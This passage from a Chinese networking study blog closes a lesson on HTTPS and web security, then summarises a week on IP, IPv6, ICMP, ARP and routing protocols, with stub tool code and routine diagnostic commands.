Encrypt是否安全？</strong></p><p>A：</p><ul><li>完全安全</li><li>免费但不降低安全性</li><li>只是自动化了流程</li><li>被主流浏览器信任</li></ul><p><strong>Q4：HTTPS一定安全吗？</strong></p><p>A：</p><ul><li>不一定</li><li>HTTPS只保证传输安全</li><li>服务器本身可能不安全</li><li>钓鱼网站也可以有HTTPS</li></ul><p><strong>Q5：HTTP&#x2F;2必须用HTTPS吗？</strong></p><p>A：</p><ul><li>标准上不强制</li><li>但所有浏览器都只支持HTTPS版本</li><li>实际上必须用HTTPS</li></ul><hr><h2 id="11-总结"><a href="#11-总结" class="headerlink" title="11. 总结"></a>11. 总结</h2><p>今天我们学习了：</p><h3 id="核心知识点"><a href="#核心知识点" class="headerlink" title="核心知识点"></a>核心知识点</h3><ol><li><p><strong>HTTPS基础</strong>：</p><ul><li>HTTP + TLS&#x2F;SSL</li><li>解决窃听、篡改、冒充</li></ul></li><li><p><strong>加密技术</strong>：</p><ul><li>对称加密：AES</li><li>非对称加密：RSA</li><li>哈希函数：SHA-256</li><li>数字签名：身份认证</li></ul></li><li><p><strong>TLS协议</strong>：</p><ul><li>TLS 1.2：2-RTT握手</li><li>TLS 1.3：1-RTT握手</li><li>协商、认证、加密</li></ul></li><li><p><strong>数字证书</strong>：</p><ul><li>服务器身份证明</li><li>CA签名</li><li>信任链</li></ul></li><li><p><strong>安全攻击</strong>：</p><ul><li>MITM：中间人攻击</li><li>SSL剥离</li><li>XSS、CSRF、SQL注入</li></ul></li><li><p><strong>最佳实践</strong>：</p><ul><li>只用TLS 1.2+</li><li>强加密套件</li><li>HSTS</li><li>安全头部</li></ul></li></ol><h3 id="重点回顾"><a href="#重点回顾" class="headerlink" title="重点回顾"></a>重点回顾</h3><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs markdown">HTTPS工作原理：<br><span class="hljs-bullet">1.</span> 客户端发起连接（ClientHello）<br><span class="hljs-bullet">2.</span> 服务器返回证书（Certificate）<br><span class="hljs-bullet">3.</span> 客户端验证证书<br><span class="hljs-bullet">4.</span> 密钥交换（KeyExchange）<br><span class="hljs-bullet">5.</span> 切换到加密通信<br><span class="hljs-bullet">6.</span> 传输加密数据<br><br>混合加密：<br>非对称加密（RSA）→ 交换密钥<br>对称加密（AES）→ 加密数据<br><br>证书验证：<br>检查有效期 → 验证CA签名 → 检查域名 → 检查吊销状态<br></code></pre></td></tr></table></figure><h3 id="明天预告"><a href="#明天预告" class="headerlink" title="明天预告"></a>明天预告</h3><p><strong>第21天：第三周总结与实战</strong></p><p>内容预览：</p><ul><li>本周知识回顾</li><li>综合实战项目</li><li>性能优化技巧</li><li>调试和排错</li><li>工具和资源推荐</li></ul><hr><p><strong>继续加油！</strong> 🚀</p><p>今天我们学习了HTTPS和Web安全，这是现代互联网的基础。理解HTTPS的工作原理对于开发安全的Web应用至关重要。明天我们将进行第三周的总结，并完成一个综合实战项目！</p>]]></content>
    
    
    <categories>
      
      <category>Network</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Network, Book, Python</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>四周总结：网络层协议</title>
    <link href="/2025/11/10/%E5%9B%9B%E5%91%A8%E6%80%BB%E7%BB%93%EF%BC%9A%E7%BD%91%E7%BB%9C%E5%B1%82%E5%8D%8F%E8%AE%AE/"/>
    <url>/2025/11/10/%E5%9B%9B%E5%91%A8%E6%80%BB%E7%BB%93%EF%BC%9A%E7%BD%91%E7%BB%9C%E5%B1%82%E5%8D%8F%E8%AE%AE/</url>
    
    <content type="html"><![CDATA[<h1 id="第四周总结：网络层协议"><a href="#第四周总结：网络层协议" class="headerlink" title="第四周总结：网络层协议"></a>第四周总结：网络层协议</h1><h2 id="学习时间：第22-27天"><a href="#学习时间：第22-27天" class="headerlink" title="学习时间：第22-27天"></a>学习时间：第22-27天</h2><hr><h2 id="📚-本周学习内容"><a href="#📚-本周学习内容" class="headerlink" title="📚 本周学习内容"></a>📚 本周学习内容</h2><h3 id="Day-22：IP协议基础"><a href="#Day-22：IP协议基础" class="headerlink" title="Day 22：IP协议基础"></a>Day 22：IP协议基础</h3><ul><li>IPv4地址格式和分类</li><li>子网划分和CIDR</li><li>NAT技术</li><li>IP数据包格式</li><li>实战：IP地址计算器</li></ul><h3 id="Day-23：IPv6详解"><a href="#Day-23：IPv6详解" class="headerlink" title="Day 23：IPv6详解"></a>Day 23：IPv6详解</h3><ul><li>IPv6地址格式和压缩</li><li>IPv6特性和优势</li><li>IPv6地址类型</li><li>IPv6过渡技术</li><li>实战：IPv6地址工具</li></ul><h3 id="Day-24：ICMP和诊断工具"><a href="#Day-24：ICMP和诊断工具" class="headerlink" title="Day 24：ICMP和诊断工具"></a>Day 24：ICMP和诊断工具</h3><ul><li>ICMP协议原理</li><li>ping工作机制</li><li>traceroute实现</li><li>ICMPv6</li><li>实战：网络诊断工具</li></ul><h3 id="Day-25：ARP协议和链路层"><a href="#Day-25：ARP协议和链路层" class="headerlink" title="Day 25：ARP协议和链路层"></a>Day 25：ARP协议和链路层</h3><ul><li>ARP工作原理</li><li>ARP缓存管理</li><li>ARP安全问题</li><li>MAC地址和以太网帧</li><li>VLAN基础</li><li>实战：ARP工具套件</li></ul><h3 id="Day-26：路由协议基础"><a href="#Day-26：路由协议基础" class="headerlink" title="Day 26：路由协议基础"></a>Day 26：路由协议基础</h3><ul><li>路由表和路由查找</li><li>静态路由配置</li><li>动态路由协议</li><li>RIP协议详解</li><li>OSPF基础</li><li>实战：路由表模拟器</li></ul><h3 id="Day-27：综合实战"><a href="#Day-27：综合实战" class="headerlink" title="Day 27：综合实战"></a>Day 27：综合实战</h3><ul><li>知识点整合</li><li>综合诊断平台</li><li>网络排错案例</li><li>性能优化技巧</li><li>实战：网络诊断平台</li></ul><hr><h2 id="🎯-核心知识点"><a href="#🎯-核心知识点" class="headerlink" title="🎯 核心知识点"></a>🎯 核心知识点</h2><h3 id="1-IP协议"><a href="#1-IP协议" class="headerlink" title="1. IP协议"></a>1. IP协议</h3><p><strong>IPv4地址</strong>：</p><figure class="highlight accesslog"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs accesslog">格式：<span class="hljs-number">32</span>位，点分十进制<br>示例：<span class="hljs-number">192</span>.<span class="hljs-number">168</span>.<span class="hljs-number">1</span>.<span class="hljs-number">100</span><br><br>地址分类（传统）：<br>A类：<span class="hljs-number">0</span>.<span class="hljs-number">0</span>.<span class="hljs-number">0</span>.<span class="hljs-number">0</span> - <span class="hljs-number">127</span>.<span class="hljs-number">255</span>.<span class="hljs-number">255</span>.<span class="hljs-number">255</span>      (网络位<span class="hljs-number">8</span>位)<br>B类：<span class="hljs-number">128</span>.<span class="hljs-number">0</span>.<span class="hljs-number">0</span>.<span class="hljs-number">0</span> - <span class="hljs-number">191</span>.<span class="hljs-number">255</span>.<span class="hljs-number">255</span>.<span class="hljs-number">255</span>    (网络位<span class="hljs-number">16</span>位)<br>C类：<span class="hljs-number">192</span>.<span class="hljs-number">0</span>.<span class="hljs-number">0</span>.<span class="hljs-number">0</span> - <span class="hljs-number">223</span>.<span class="hljs-number">255</span>.<span class="hljs-number">255</span>.<span class="hljs-number">255</span>    (网络位<span class="hljs-number">24</span>位)<br>D类：<span class="hljs-number">224</span>.<span class="hljs-number">0</span>.<span class="hljs-number">0</span>.<span class="hljs-number">0</span> - <span class="hljs-number">239</span>.<span class="hljs-number">255</span>.<span class="hljs-number">255</span>.<span class="hljs-number">255</span>    (多播)<br>E类：<span class="hljs-number">240</span>.<span class="hljs-number">0</span>.<span class="hljs-number">0</span>.<span class="hljs-number">0</span> - <span class="hljs-number">255</span>.<span class="hljs-number">255</span>.<span class="hljs-number">255</span>.<span class="hljs-number">255</span>    (保留)<br><br>私有地址：<br><span class="hljs-number">10.0.0.0</span>/<span class="hljs-number">8</span><br><span class="hljs-number">172.16.0.0</span>/<span class="hljs-number">12</span><br><span class="hljs-number">192.168.0.0</span>/<span class="hljs-number">16</span><br><br>特殊地址：<br><span class="hljs-number">127.0.0.1</span>         环回地址<br><span class="hljs-number">0.0.0.0</span>          未指定地址<br><span class="hljs-number">255.255.255.255</span>  广播地址<br><br>子网划分：<br>CIDR：无类域间路由<br>VLSM：可变长子网掩码<br></code></pre></td></tr></table></figure><p><strong>IPv6地址</strong>：</p><figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs elixir">格式：<span class="hljs-number">128</span>位，冒号十六进制<br>示例：<span class="hljs-number">2001</span><span class="hljs-symbol">:db8</span>::<span class="hljs-number">1</span><br><br>压缩规则：<br><span class="hljs-number">1</span>. 省略前导零<br><span class="hljs-number">2</span>. 连续零用::表示（只能用一次）<br><br>地址类型：<br>全局单播：<span class="hljs-number">2000</span>::/<span class="hljs-number">3</span><br>链路本地：fe80::/<span class="hljs-number">10</span><br>唯一本地：fc00::/<span class="hljs-number">7</span><br>多播：ff00::/<span class="hljs-number">8</span><br>环回：::<span class="hljs-number">1</span><br><br>优势：<br>✅ 巨大地址空间（<span class="hljs-number">2</span>^<span class="hljs-number">128</span>）<br>✅ 简化头部<br>✅ 内置安全性<br>✅ 无需<span class="hljs-title class_">NAT</span><br>✅ 自动配置（<span class="hljs-title class_">SLAAC</span>）<br></code></pre></td></tr></table></figure><h3 id="2-ICMP协议"><a href="#2-ICMP协议" class="headerlink" title="2. ICMP协议"></a>2. ICMP协议</h3><p><strong>主要类型</strong>：</p><figure class="highlight ada"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs ada"><span class="hljs-keyword">Type</span> <span class="hljs-type">0/8：回显应答/请求（ping）</span><br><span class="hljs-type"></span><span class="hljs-keyword">Type</span> <span class="hljs-type">3：目标不可达</span><br><span class="hljs-type"></span><span class="hljs-keyword">Type</span> <span class="hljs-type">5：重定向</span><br><span class="hljs-type"></span><span class="hljs-keyword">Type</span> <span class="hljs-type">11：超时（traceroute）</span><br><span class="hljs-type"></span><br><span class="hljs-type"></span>ping工作流程：<br>发送ICMP Echo Request (<span class="hljs-keyword">Type</span> <span class="hljs-type">8)</span><br><span class="hljs-type"></span>→ 目标返回Echo Reply (<span class="hljs-keyword">Type</span> <span class="hljs-type">0)</span><br><span class="hljs-type"></span>→ 计算RTT<br>→ 统计丢包率<br><br>traceroute原理：<br>TTL=<span class="hljs-number">1</span> → 第<span class="hljs-number">1</span>跳返回超时<br>TTL=<span class="hljs-number">2</span> → 第<span class="hljs-number">2</span>跳返回超时<br>...<br>直到到达目标<br></code></pre></td></tr></table></figure><h3 id="3-ARP协议"><a href="#3-ARP协议" class="headerlink" title="3. ARP协议"></a>3. ARP协议</h3><p><strong>工作流程</strong>：</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs markdown"><span class="hljs-bullet">1.</span> 查ARP缓存<br>   → 有：直接使用<br>   → 无：继续<br><br><span class="hljs-bullet">2.</span> 广播ARP请求<br>   &quot;谁是192.168.1.100？我的MAC是aa:bb:cc:dd:ee:ff&quot;<br><br><span class="hljs-bullet">3.</span> 目标主机单播应答<br>   &quot;我是192.168.1.100，我的MAC是11:22:33:44:55:66&quot;<br><br><span class="hljs-bullet">4.</span> 更新ARP缓存<br><br><span class="hljs-bullet">5.</span> 发送数据包<br><br>ARP安全问题：<br><span class="hljs-bullet">-</span> ARP欺骗/缓存投毒<br><span class="hljs-bullet">-</span> 中间人攻击<br><br>防御措施：<br><span class="hljs-bullet">-</span> 动态ARP检测（DAI）<br><span class="hljs-bullet">-</span> 静态ARP绑定<br><span class="hljs-bullet">-</span> 端口安全<br><span class="hljs-bullet">-</span> 使用加密协议<br></code></pre></td></tr></table></figure><h3 id="4-路由协议"><a href="#4-路由协议" class="headerlink" title="4. 路由协议"></a>4. 路由协议</h3><p><strong>路由表查找</strong>：</p><figure class="highlight dns"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs dns">最长前缀匹配：<br>优先级：主机路由(/<span class="hljs-number">32</span>) &gt; 子网路由 &gt; 聚合路由 &gt; 默认路由(/<span class="hljs-number">0</span>)<br><br>示例：<br>路由表：<br><span class="hljs-number">1</span>. <span class="hljs-number">0.0.0.0</span>/<span class="hljs-number">0</span><br><span class="hljs-number">2</span>. <span class="hljs-number">10.0.0.0</span>/<span class="hljs-number">8</span><br><span class="hljs-number">3</span>. <span class="hljs-number">10.1.0.0</span>/<span class="hljs-number">16</span><br><span class="hljs-number">4</span>. <span class="hljs-number">10.1.2.0</span>/<span class="hljs-number">24</span><br><br>查询<span class="hljs-number">10.1.2.100</span>：<br>匹配所有路由，选择/<span class="hljs-number">24</span>（最长）<br></code></pre></td></tr></table></figure><p><strong>动态路由协议对比</strong>：</p><figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs asciidoc">┌──────────────┬──────────────┬──────────────┐<br>│   特性       │     RIP      │    OSPF      │<br>├──────────────┼──────────────┼──────────────┤<br>│ 类型         │  距离矢量    │  链路状态    │<br>│ 算法         │ Bellman-Ford │  Dijkstra    │<br>│ 度量         │  跳数        │  Cost(带宽)  │<br>│ 最大跳数     │  15          │  无限制      │<br>│ 收敛速度     │  慢          │  快          │<br>│ 更新方式     │  整个路由表  │  链路状态    │<br>│ 更新周期     │  30秒        │  事件触发    │<br>│ 适用场景     │  小型网络    │  大型网络    │<br>└──────────────┴──────────────┴──────────────┘<br><br>RIP防环机制：<br><span class="hljs-bullet">- </span>最大跳数（15）<br><span class="hljs-bullet">- </span>水平分割<br><span class="hljs-bullet">- </span>毒性逆转<br><span class="hljs-bullet">- </span>抑制定时器<br><span class="hljs-bullet">- </span>触发更新<br><br>OSPF特点：<br><span class="hljs-bullet">- </span>区域设计（Area 0骨干区域）<br><span class="hljs-bullet">- </span>邻居关系建立<br><span class="hljs-bullet">- </span>LSA泛洪<br><span class="hljs-bullet">- </span>SPF计算<br></code></pre></td></tr></table></figure><hr><h2 id="💻-实战项目"><a href="#💻-实战项目" class="headerlink" title="💻 实战项目"></a>💻 实战项目</h2><h3 id="1-IP地址计算器（Day-22）"><a href="#1-IP地址计算器（Day-22）" class="headerlink" title="1. IP地址计算器（Day 22）"></a>1. IP地址计算器（Day 22）</h3><ul><li>网络地址计算</li><li>广播地址计算</li><li>可用主机数量</li><li>子网划分</li><li>VLSM计算</li></ul><p><strong>核心功能</strong>：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">analyze_network</span>(<span class="hljs-params">self, network_str</span>):<br>    <span class="hljs-comment"># 分析IP网络</span><br>    <span class="hljs-comment"># 计算网络地址、广播地址</span><br>    <span class="hljs-comment"># 显示可用主机范围</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">subnet_division</span>(<span class="hljs-params">self, network_str, num_subnets</span>):<br>    <span class="hljs-comment"># 子网划分</span><br>    <span class="hljs-comment"># 自动计算新前缀长度</span><br>    <span class="hljs-comment"># 显示所有子网信息</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">vlsm_calculation</span>(<span class="hljs-params">self, network_str, requirements</span>):<br>    <span class="hljs-comment"># VLSM计算</span><br>    <span class="hljs-comment"># 根据主机数量需求分配</span><br>    <span class="hljs-comment"># 优化地址空间利用</span><br></code></pre></td></tr></table></figure><h3 id="2-IPv6地址工具（Day-23）"><a href="#2-IPv6地址工具（Day-23）" class="headerlink" title="2. IPv6地址工具（Day 23）"></a>2. IPv6地址工具（Day 23）</h3><ul><li>地址压缩和扩展</li><li>地址类型识别</li><li>EUI-64计算</li><li>IPv4映射地址</li><li>子网信息</li></ul><p><strong>核心功能</strong>：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">compress_ipv6</span>(<span class="hljs-params">self, addr_str</span>):<br>    <span class="hljs-comment"># 压缩IPv6地址</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">expand_ipv6</span>(<span class="hljs-params">self, addr_str</span>):<br>    <span class="hljs-comment"># 扩展为完整格式</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">get_address_type</span>(<span class="hljs-params">self, addr_str</span>):<br>    <span class="hljs-comment"># 识别地址类型</span><br>    <span class="hljs-comment"># 环回、链路本地、全局等</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">mac_to_eui64</span>(<span class="hljs-params">self, mac_str, prefix_str</span>):<br>    <span class="hljs-comment"># MAC转EUI-64</span><br>    <span class="hljs-comment"># 生成IPv6接口标识符</span><br></code></pre></td></tr></table></figure><h3 id="3-网络诊断工具（Day-24）"><a href="#3-网络诊断工具（Day-24）" class="headerlink" title="3. 网络诊断工具（Day 24）"></a>3. 网络诊断工具（Day 24）</h3><ul><li>Ping实现</li><li>Traceroute实现</li><li>网络质量测试</li><li>综合诊断</li></ul><p><strong>核心功能</strong>：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">class</span> <span class="hljs-title class_">Ping</span>:<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">run</span>(<span class="hljs-params">self</span>):<br>        <span class="hljs-comment"># 发送ICMP Echo Request</span><br>        <span class="hljs-comment"># 接收Echo Reply</span><br>        <span class="hljs-comment"># 计算RTT和丢包率</span><br>        <span class="hljs-comment"># 显示统计信息</span><br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">Traceroute</span>:<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">run</span>(<span class="hljs-params">self</span>):<br>        <span class="hljs-comment"># TTL从1开始递增</span><br>        <span class="hljs-comment"># 接收ICMP超时消息</span><br>        <span class="hljs-comment"># 记录每一跳</span><br>        <span class="hljs-comment"># 显示路径</span><br></code></pre></td></tr></table></figure><h3 id="4-ARP工具套件（Day-25）"><a href="#4-ARP工具套件（Day-25）" class="headerlink" title="4. ARP工具套件（Day 25）"></a>4. ARP工具套件（Day 25）</h3><ul><li>ARP缓存查看</li><li>ARP扫描</li><li>ARP监控</li><li>安全检测</li></ul><p><strong>核心功能</strong>：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">class</span> <span class="hljs-title class_">ARPCache</span>:<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">show</span>():<br>        <span class="hljs-comment"># 显示ARP缓存表</span><br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">ARPScanner</span>:<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">scan</span>(<span class="hljs-params">self, network</span>):<br>        <span class="hljs-comment"># 扫描网络段</span><br>        <span class="hljs-comment"># 发现活动主机</span><br>        <span class="hljs-comment"># 显示IP和MAC</span><br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">ARPMonitor</span>:<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">start</span>(<span class="hljs-params">self</span>):<br>        <span class="hljs-comment"># 实时监控ARP流量</span><br>        <span class="hljs-comment"># 检测MAC地址变化</span><br>        <span class="hljs-comment"># 警告异常活动</span><br></code></pre></td></tr></table></figure><h3 id="5-路由表模拟器（Day-26）"><a href="#5-路由表模拟器（Day-26）" class="headerlink" title="5. 路由表模拟器（Day 26）"></a>5. 路由表模拟器（Day 26）</h3><ul><li>路由表管理</li><li>路由查找演示</li><li>RIP协议模拟</li></ul><p><strong>核心功能</strong>：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">class</span> <span class="hljs-title class_">RoutingTable</span>:<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">add_route</span>(<span class="hljs-params">self, route</span>):<br>        <span class="hljs-comment"># 添加路由</span><br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">lookup</span>(<span class="hljs-params">self, ip_address</span>):<br>        <span class="hljs-comment"># 最长前缀匹配查找</span><br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">show</span>(<span class="hljs-params">self</span>):<br>        <span class="hljs-comment"># 显示路由表</span><br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">RIPSimulator</span>:<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">simulate</span>(<span class="hljs-params">self</span>):<br>        <span class="hljs-comment"># 模拟RIP协议运行</span><br>        <span class="hljs-comment"># 路由更新和收敛</span><br>        <span class="hljs-comment"># 防环机制演示</span><br></code></pre></td></tr></table></figure><h3 id="6-综合诊断平台（Day-27）"><a href="#6-综合诊断平台（Day-27）" class="headerlink" title="6. 综合诊断平台（Day 27）"></a>6. 综合诊断平台（Day 27）</h3><ul><li>自动诊断网络问题</li><li>生成诊断报告</li><li>提供解决建议</li></ul><p><strong>核心功能</strong>：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">class</span> <span class="hljs-title class_">NetworkDiagnostic</span>:<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">diagnose</span>(<span class="hljs-params">self</span>):<br>        <span class="hljs-comment"># 1. 收集本机信息</span><br>        <span class="hljs-comment"># 2. 测试网关连通性</span><br>        <span class="hljs-comment"># 3. 测试DNS解析</span><br>        <span class="hljs-comment"># 4. 测试外网连通性</span><br>        <span class="hljs-comment"># 5. 路径追踪</span><br>        <span class="hljs-comment"># 6. 性能测试</span><br>        <span class="hljs-comment"># 7. 生成报告</span><br></code></pre></td></tr></table></figure><hr><h2 id="🔧-掌握的工具"><a href="#🔧-掌握的工具" class="headerlink" title="🔧 掌握的工具"></a>🔧 掌握的工具</h2><h3 id="网络诊断工具"><a href="#网络诊断工具" class="headerlink" title="网络诊断工具"></a>网络诊断工具</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># 连通性测试</span><br>ping &lt;目标&gt;<br>ping6 &lt;IPv6目标&gt;<br><br><span class="hljs-comment"># 路径追踪</span><br>traceroute &lt;目标&gt;<br>traceroute6 &lt;IPv6目标&gt;<br>tracert &lt;目标&gt;  <span class="hljs-comment"># Windows</span><br><br><span class="hljs-comment"># ARP管理</span><br>arp -a          <span class="hljs-comment"># 查看ARP缓存</span><br>arp -d &lt;IP&gt;     <span class="hljs-comment"># 删除ARP条目</span><br>arp -s &lt;IP&gt; &lt;MAC&gt;  <span class="hljs-comment"># 添加静态ARP</span><br>ip neigh show   <span class="hljs-comment"># Linux新命令</span><br><br><span class="hljs-comment"># 路由管理</span><br>route -n        <span class="hljs-comment"># 查看路由表</span><br>ip route show   <span class="hljs-comment"># Linux新命令</span><br>route add       <span class="hljs-comment"># 添加路由</span><br>route del       <span class="hljs-comment"># 删除路由</span><br><br><span class="hljs-comment"># 网络配置</span><br>ifconfig        <span class="hljs-comment"># 老命令</span><br>ip addr show    <span class="hljs-comment"># 新命令</span><br>ip <span class="hljs-built_in">link</span> show    <span class="hljs-comment"># 链路层信息</span><br></code></pre></td></tr></table></figure><h3 id="网络分析工具"><a href="#网络分析工具" class="headerlink" title="网络分析工具"></a>网络分析工具</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># 抓包分析</span><br>tcpdump -i eth0 icmp<br>tcpdump -i eth0 arp<br>wireshark<br><br><span class="hljs-comment"># 连接状态</span><br>netstat -an<br>ss -antp<br><br><span class="hljs-comment"># DNS查询</span><br>nslookup &lt;域名&gt;<br>dig &lt;域名&gt;<br>host &lt;域名&gt;<br><br><span class="hljs-comment"># 网络性能</span><br>iperf3 -s       <span class="hljs-comment"># 服务端</span><br>iperf3 -c &lt;服务器&gt;  <span class="hljs-comment"># 客户端</span><br>mtr &lt;目标&gt;      <span class="hljs-comment"># 实时路由追踪</span><br></code></pre></td></tr></table></figure><hr><h2 id="📈-技能提升"><a href="#📈-技能提升" class="headerlink" title="📈 技能提升"></a>📈 技能提升</h2><h3 id="理论知识"><a 